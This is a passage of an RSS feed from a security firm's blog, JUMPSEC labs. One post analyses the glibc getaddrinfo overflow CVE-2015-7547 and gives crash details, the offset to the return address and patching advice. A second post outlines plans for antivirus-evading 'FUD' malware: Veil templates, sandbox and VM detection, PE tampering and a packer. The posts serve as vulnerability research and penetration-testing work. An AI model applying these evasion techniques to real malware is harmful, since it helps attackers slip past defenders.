    &lt;a href=&#34;#thirdresponse&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;[caption id=&amp;ldquo;attachment_164&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;482&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter5.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter5.png&#34; alt=&#34;alter5&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Code snippet[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_165&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;493&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter5b.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter5b.png&#34; alt=&#34;alter5b&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Packet capture snippet[/caption]&lt;/p&gt;
&lt;p&gt;This is the third response sent by the “malicious” DNS server. It is another malformed packet which is carrying the payload. JUMPSEC researcher has modified the Google POC code to identify the the number of bytes to cause a segmentation fault (possibly overwriting the RET address) of the buffer. It is found that the RET address is being overwritten on the 2079th byte. With the addition of return_to_libc technique, an attacker can bypass OS protection such as NX bit or ASLR and perform remote code execution.&lt;/p&gt;
&lt;h2&gt;Google POC debugging and crash analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;google-poc-debugging-and-crash-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#google-poc-debugging-and-crash-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;JUMPSEC has run it through the trusty gdb. It crashes with a SEGMENTATION FAULT which verifies that the DNS response has smashed the stack of the vulnerable client application when running getaddrinfo(). The vulnerable buffer is operated in gaih_getanswer. The entry address has been overwritten with 0x4443424144434241 (ABCDABCD). The state of the register also showing the overflowed bytes.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_166&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;888&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter6.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter6.png&#34; alt=&#34;alter6&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; SEGFAULT from vulnerable client. RET address is overwritten with “ABCDABCD”[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_167&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;889&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter7.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter7.png&#34; alt=&#34;alter7&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Backtrack[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_194&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;666&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/cropped.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/cropped.png&#34; alt=&#34;cropped&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Registers[/caption]&lt;/p&gt;
&lt;p&gt;JUMPSEC has also tested it on a few other applications. It was found that the getaddrinfo() function in glibc is commonly used…&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter9.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter9.png&#34; alt=&#34;alter9&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_170&amp;rdquo; align=&amp;ldquo;alignleft&amp;rdquo; width=&amp;ldquo;938&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter10.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter10.png&#34; alt=&#34;alter10&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Iceweasel crashing[/caption]&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The best way to mitigate this issue is to enforce proper patching management. Make sure to update all your systems with the latest version of glibc . If you have any systems exposed on the internet and you want to make sure that this vulnerability is not triggered then the following Wireshark filter could be useful: (DNS.length&amp;gt;2048 to see malformed packets). A DNS response has a maximum of 512 bytes (typically), note that the DNS reply is truncated. Even if the client does not accept large response, smaller responses can be combine into a large one which can also trigger the vulnerability. A possible filter is to monitor the size of the entire conversation as a distinct amount of bytes in total is require to trigger specific responses from vulnerable client and all of them requires more than 2048 bytes.&lt;/p&gt;
&lt;p&gt;The above vulnerability can be fixed by patching. If you are running RedHat or CentOS a simple&lt;/p&gt;
&lt;p&gt;&lt;em&gt;yum -y update glibc&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;will update the libc and resolve the issue (remember to restart the service right after the update!).&lt;/p&gt;
&lt;h2&gt;Reference links&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reference-links&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reference-links&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7547&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7547&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://pubs.opengroup.org/onlinepubs/9699919799/functions/freeaddrinfo.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://pubs.opengroup.org/onlinepubs/9699919799/functions/freeaddrinfo.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://googleonlinesecurity.blogspot.co.uk/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://googleonlinesecurity.blogspot.co.uk/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Research and Development</title>
      <link>//localhost:1313/articles/2016/01/2016-01-28-research-and-development/</link>
      <pubDate>Thu, 28 Jan 2016 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2016/01/2016-01-28-research-and-development/</guid>
      <description>
        
        
        &lt;p&gt;Hello w0rld. On this post we would like to let you know our areas of research and the research projects that we are working on currently. For 2016 we are planning to develop tools that will be used in our tests. Our areas of interest can be highlighted as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;AntiVirus Detection and Evasion techniques (sandbox detection, etc)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Packers, anti-debugging, anti-disassembly and binary obfuscation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Network packet capture analysis scripts looking for IoC&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;FUD Malware (maybe Veil Improvisation)&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The initial idea is to find a way to create several different templates on top of Veil. Additionally we can implement several add-ons for Virtual Machine detection or Sandbox Environment detection. This can be either logical-based such as human interaction or can be through technical means like red pills. Even 2-3 assembly instructions can be used for identifying a sandbox environment. Veil exports a .py file which is quite random. It randomizes variable names and also since it uses encryption it randomizes the key that will be used. Then it encrypts the payload and stores it in a .stub area on the binary. This area will be unfold after the execution and a routine is responsible for decrypting and launching the payload. This doesn’t offer and sandbox detection nor VM detection. It is heavily focused against AVs and specifically it is focused defeating signature-based detection systems. The idea of having different binaries but still using the same payload (meterpreter) is necessary for pentesters and for generating quickly payloads that will be used in social engineering tasks. Technically now the most important property is the large keyspace. The larger the key space the more ‘impossible’ to hit the same binary twice. Veil is providing that but still there are issues with the actual binary. My thought is to either break the exported binary and placed it under a new one OR just add several lines of code in the python script that will be used for compilation (through py2exe or pwninstaller). Another possibility is to mess around the pwninstaller and add things there. Another idea is to add randomisation on techniques defeating / escaping sandbox environments. Things that are looking promising:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Mess with the actual PE Header, things like .STAB areas, add more stab areas add junk data to stab areas or even add other encrypted data that might look interesting (hyperion paper also has a super cool idea…)&lt;/li&gt;
&lt;li&gt;Change the file size of the exported binary dynamically. This will happen assuming the above will happen. (Can also be randomized with NOP padding&lt;/li&gt;
&lt;li&gt;Change values that will not necessarily mess the execution (maybe the versioning of the PE? or the Entry point of the binary?)&lt;/li&gt;
&lt;li&gt;Write a small scale packer for performance and maybe add also VM detection there&lt;/li&gt;
&lt;li&gt;Employ sandbox detection and VM detection through several means (this also adds to the 2nd step)&lt;/li&gt;
&lt;li&gt;Randomized routines for sandbox detection (if mouse_right_click = %random_value then decrypt else break/sleep)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Implementation techniques will include ctypes for sandbox detection and adding loops or other useless things such as calculations. Also using ndisasm or pyelf for messing the binary it is suggested. Red pills can be used in several different techniques.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Packer&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Another idea that JUMPSEC labs have is to develop their own packer. This will have several routines for:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Static analysis obfuscation: Encryption&lt;/li&gt;
&lt;li&gt;Dynamic analysis obfuscation: Add noise in program flow/Add randomness to data/runtime&lt;/li&gt;
&lt;li&gt;Anti-debugging&lt;/li&gt;
&lt;li&gt;Sandbox escape: Detect human interactions&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Network Analysis Scripts&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We are developing several scripts for analysing pcap files. The purpose of these scripts is to parse packet captures and to identify whether there are IoC (Indicators of Compromise) by performing statistical analysis of the protocols usage and searching for potential protocol misuse (HTTP requests / responses that arent according to RFC).&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
